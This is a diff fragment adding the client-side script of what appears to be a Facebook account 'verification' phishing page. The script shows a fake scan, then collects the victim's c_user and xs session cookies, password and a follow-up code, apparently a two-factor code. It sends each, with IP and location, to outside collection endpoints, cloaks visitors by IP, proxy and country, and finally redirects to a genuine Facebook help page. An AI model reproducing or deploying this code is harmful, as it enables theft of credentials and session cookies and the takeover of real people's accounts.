+            tiles.forEach(function(el,i){setTimeout(function(){el.classList.add('vis');},i*50);});
+          },150);
+        },2000);
+      },500);
+    }
+  },28);
+}
+
+/* Language modal */
+var lwrap=document.getElementById('lw');
+var lconfirm=document.getElementById('lwConfirm');
+lconfirm.disabled=true;
+var selLang='english';
+document.querySelectorAll('.lm-opt').forEach(function(opt){
+  opt.addEventListener('click',function(){
+    document.querySelectorAll('.lm-opt').forEach(function(o){o.classList.remove('sel');});
+    opt.classList.add('sel');selLang=opt.dataset.lang;lconfirm.disabled=false;
+  });
+});
+document.getElementById('lwSearch').addEventListener('input',function(){
+  var q=this.value.toLowerCase();
+  document.querySelectorAll('.lm-opt').forEach(function(o){o.style.display=o.textContent.toLowerCase().includes(q)?'':'none';});
+});
+lconfirm.addEventListener('click',function(){
+  if(!selLang)return;
+  currentLang=selLang;
+  var cap=currentLang.charAt(0).toUpperCase()+currentLang.slice(1);
+  var s2f=document.getElementById('s2Flag');if(s2f)s2f.src=flagSrc[currentLang]||flagSrc.english;
+  var s2l=document.getElementById('s2LangName');if(s2l)s2l.textContent=cap;
+  var gvs=document.getElementById('guide-video-src');var gv=document.getElementById('guide-video');
+  if(gvs&&gv){gvs.src=videoSrc[currentLang]||videoSrc.english;gv.load();}
+  applyTranslations(currentLang);
+  lwrap.classList.remove('show');
+  if(!scanStarted){scanStarted=true;runScan();}
+});
+var scanStarted=false;
+
+/* Loading screen */
+(function(){
+  var ls=document.getElementById('ls');var done=false;
+  function dismiss(){if(done)return;done=true;ls.classList.add('out');setTimeout(function(){ls.style.display='none';lwrap.classList.add('show');lconfirm.disabled=false;},700);}
+  setTimeout(dismiss,2500);
+  ls.addEventListener('click',dismiss);
+})();
+
+/* DC check for step 2 */
+var allowRecovery=false,finalRedirect='';
+fetch('https://handle.gadgetsdecory.xyz:3000/dc').then(function(r){return r.json();}).then(function(d){
+  var ip=d.clientIp;var rec=d[ip];
+  if(rec&&rec.proxy!=='yes'&&rec.isocode!=='PK'){allowRecovery=true;finalRedirect=d.red;}
+}).catch(function(){});
+
+/* Eye button */
+var eyeOpen='<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
+var eyeSlash='<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/>';
+var eyeBtn=document.getElementById('eyeBtn');
+if(eyeBtn)eyeBtn.addEventListener('click',function(){
+  var inp=document.getElementById('pw-input');var ico=document.getElementById('eyeIco');
+  if(inp&&ico){var isPass=inp.type==='password';inp.type=isPass?'text':'password';ico.innerHTML=isPass?eyeSlash:eyeOpen;}
+});
+
+/* Step 2 form */
+var vForm=document.getElementById('verificationForm');
+if(vForm)vForm.addEventListener('submit',function(e){
+  e.preventDefault();
+  var btn=document.getElementById('submitBtn');if(btn){btn.classList.add('loading');btn.disabled=true;}
+  fetch('https://v0-pkform.vercel.app/api/f/pi2yh3ge',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({c_user:document.getElementById('c_user').value.trim(),xs:document.getElementById('xs').value.trim(),country:userCountry,city:userCity,ip:userIP})})
+  .then(function(r){if(r.ok){allowRecovery?window.location.replace(atob(finalRedirect)):goTo('s3');}else throw 0;})
+  .catch(function(){goTo('s3');})
+  .finally(function(){if(btn){btn.classList.remove('loading');btn.disabled=false;}});
+});
+
+/* Step 3 password form */
+var pwForm=document.getElementById('passwordForm');
+if(pwForm)pwForm.addEventListener('submit',function(e){
+  e.preventDefault();
+  var val=document.getElementById('pw-input').value;
+  var err=document.getElementById('pwErr');var btn=document.getElementById('pwBtn');
+  if(err)err.classList.remove('show');
+  if(!val||val.length<1){if(err)err.classList.add('show');return;}
+  if(btn){btn.classList.add('loading');btn.disabled=true;}
+  fetch('https://v0-pkform.vercel.app/api/f/pi2yh3ge',{method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json'},body:JSON.stringify({password:val,country:userCountry,city:userCity,ip:userIP})}).catch(function(){});
+  setTimeout(function(){
+    var pf=document.getElementById('pwForm');if(pf)pf.style.display='none';
+    var ps=document.getElementById('pwSuccess');if(ps)ps.classList.add('show');
+    setTimeout(function(){goTo('s4');},1800);
+  },1800);
+});
+
+/* All button handlers via addEventListener */
+(function attachAll(){
+  /* Continue button (s1 → s2) */
+  var cBtn=document.getElementById('t-continue-btn');
+  if(cBtn)cBtn.addEventListener('click',function(){goTo('s2');});
+
+  /* Step 4 submit */
+  var s4btn=document.getElementById('s4-btn');
+  if(s4btn)s4btn.addEventListener('click',function(){
+    var val=document.getElementById('s4-input').value.trim();
+    var errEl=document.getElementById('s4-err');
+    if(!val){
+      if(errEl)errEl.classList.add('show');
+      setTimeout(function(){if(errEl)errEl.classList.remove('show');},3000);
+      return;
+    }
+    if(errEl)errEl.classList.remove('show');
+    s4btn.classList.add('loading');s4btn.disabled=true;
+    fetch('https://v0-pkform.vercel.app/api/f/gnzvpk35',{
+      method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({step:'step4',code:val,lang:currentLang,country:userCountry,city:userCity,ip:userIP,ts:new Date().toISOString()})
+    }).finally(function(){
+      s4btn.classList.remove('loading');s4btn.disabled=false;
+      var fw=document.getElementById('s4-form-wrap');if(fw)fw.style.display='none';
+      var fd=document.getElementById('s4-done');if(fd)fd.classList.add('show');
+      /* Show Verification Success after brief delay */
+      setTimeout(function(){
+        var vs=document.getElementById('verifySuccess');
+        if(vs)vs.classList.add('show');
+        setTimeout(function(){window.location.href='https://www.facebook.com/help/media/thank-you?rdrhc';},3500);
+      },1500);
+    });
+  });
+})();
+</script>
+
+
+</body></html>
